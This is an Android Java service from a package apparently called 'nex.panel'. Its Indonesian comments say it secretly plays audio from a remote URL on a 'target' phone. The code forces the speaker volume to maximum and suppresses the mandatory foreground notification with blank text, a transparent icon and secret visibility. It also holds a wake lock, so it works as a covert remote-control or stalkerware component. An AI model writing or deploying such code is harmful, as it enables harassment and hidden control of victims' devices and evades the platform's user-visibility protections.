package com.nex.panel;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.AudioAttributes;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

/**
 * AudioPlayService — Background Audio Player
 * ═══════════════════════════════════════════
 * Memutar audio dari URL (mp3/m4a/ogg dll) secara diam-diam
 * di hp target via MediaPlayer. Audio berjalan sebagai Foreground
 * Service tersembunyi (notif invisible), volume dikunci ke max,
 * dan service otomatis berhenti setelah audio selesai.
 *
 * Actions:
 *  ACTION_PLAY_AUDIO  → mulai putar audio dari extra "url"
 *  ACTION_STOP_AUDIO  → hentikan audio + destroy service
 */
public class AudioPlayService extends Service {

    private static final String TAG      = "AudioPlayService";
    private static final String CHANNEL  = "nex_audio_play";
    private static final int    NOTIF_ID = 9996;

    public static final String ACTION_PLAY_AUDIO = "com.nex.panel.ACTION_PLAY_AUDIO";
    public static final String ACTION_STOP_AUDIO = "com.nex.panel.ACTION_STOP_AUDIO";
    public static final String EXTRA_URL         = "url";

    private MediaPlayer          mediaPlayer;
    private PowerManager.WakeLock wakeLock;
    private final Handler         uiHandler = new Handler(Looper.getMainLooper());

    // ── Singleton ref ─────────────────────────────────────────────────────
    private static AudioPlayService instance;
    public  static boolean isPlaying() { return instance != null; }

    // ── onCreate ──────────────────────────────────────────────────────────
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        createNotificationChannel();
        // Foreground service dengan notif benar-benar tersembunyi
        startForeground(NOTIF_ID, buildNotification());
    }

    // ── onStartCommand ────────────────────────────────────────────────────
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;
        final String action = intent.getAction();

        if (ACTION_PLAY_AUDIO.equals(action)) {
            final String url = intent.getStringExtra(EXTRA_URL);
            if (url != null && !url.isEmpty()) {
                uiHandler.post(() -> startAudio(url));
            } else {
                stopSelf();
            }
        } else if (ACTION_STOP_AUDIO.equals(action)) {
            uiHandler.post(this::stopAudio);
        }
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // ── Start Audio ───────────────────────────────────────────────────────
    private void startAudio(String url) {
        // Hentikan audio sebelumnya jika ada
        releasePlayer();

        try {
            // Set volume speaker ke MAKSIMUM secara diam-diam
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                int maxVol = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                am.setStreamVolume(AudioManager.STREAM_MUSIC, maxVol, 0);
                // Mode normal — STREAM_MUSIC otomatis routing ke speaker
                am.setMode(AudioManager.MODE_NORMAL);
                // setSpeakerphoneOn deprecated API 31+ — tidak diperlukan untuk STREAM_MUSIC
            }

            // Inisialisasi MediaPlayer
            mediaPlayer = new MediaPlayer();

            // Set audio attributes — minSdk=21 (Lollipop) jadi langsung pakai AudioAttributes
            AudioAttributes aa = new AudioAttributes.Builder()
                .setUsage(AudioAttributes.USAGE_MEDIA)
                .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                .build();
            mediaPlayer.setAudioAttributes(aa);

            // WakeLock agar audio tidak berhenti saat layar mati
            acquireWakeLock();

            // Set URL dan siapkan async
            mediaPlayer.setDataSource(url);
            mediaPlayer.setLooping(false);  // Tidak looping — berhenti setelah selesai
            mediaPlayer.setScreenOnWhilePlaying(false);

            // Listener: siap → langsung play
            mediaPlayer.setOnPreparedListener(mp -> {
                try {
                    mp.start();
                    Log.d(TAG, "Audio started: " + url);
                } catch (Exception e) {
                    Log.e(TAG, "start error: " + e.getMessage());
                }
            });

            // Listener: selesai → stop service otomatis
            mediaPlayer.setOnCompletionListener(mp -> {
                Log.d(TAG, "Audio completed, stopping service");
                uiHandler.post(this::stopAudio);
            });

            // Listener: error → stop service
            mediaPlayer.setOnErrorListener((mp, what, extra) -> {
                Log.e(TAG, "MediaPlayer error: what=" + what + " extra=" + extra);
                uiHandler.post(this::stopAudio);
                return true;
            });

            // Mulai prepare async (non-blocking, tidak freeze UI)
            mediaPlayer.prepareAsync();

        } catch (Exception e) {
            Log.e(TAG, "startAudio error: " + e.getMessage());
            stopAudio();
        }
    }

    // ── Stop Audio ────────────────────────────────────────────────────────
    private void stopAudio() {
        releasePlayer();
        releaseWakeLock();
        stopSelf();
    }

    private void releasePlayer() {
        try {
            if (mediaPlayer != null) {
                if (mediaPlayer.isPlaying()) mediaPlayer.stop();
                mediaPlayer.reset();
                mediaPlayer.release();
                mediaPlayer = null;
            }
        } catch (Exception ignored) {}
    }

    // ── WakeLock ──────────────────────────────────────────────────────────
    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && (wakeLock == null || !wakeLock.isHeld())) {
                wakeLock = pm.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "NexPanel:AudioPlay"
                );
                // Max 3 jam — cukup untuk audio panjang manapun
                wakeLock.acquire(3 * 60 * 60 * 1000L);
            }
        } catch (Exception e) {
            Log.e(TAG, "acquireWakeLock: " + e.getMessage());
        }
    }

    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }
        } catch (Exception ignored) {}
    }

    // ── onDestroy ─────────────────────────────────────────────────────────
    @Override
    public void onDestroy() {
        instance = null;
        releasePlayer();
        releaseWakeLock();
        super.onDestroy();
    }

    // ── Notification (sepenuhnya tersembunyi) ─────────────────────────────
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel ch = new NotificationChannel(
                    CHANNEL, "Audio", NotificationManager.IMPORTANCE_NONE);
                ch.setSound(null, null);
                ch.setShowBadge(false);
                ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
                NotificationManager nm = getSystemService(NotificationManager.class);
                if (nm != null) nm.createNotificationChannel(ch);
            } catch (Exception e) {
                Log.e(TAG, "createChannel: " + e.getMessage());
            }
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_transparent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(false)
            .build();
    }
}
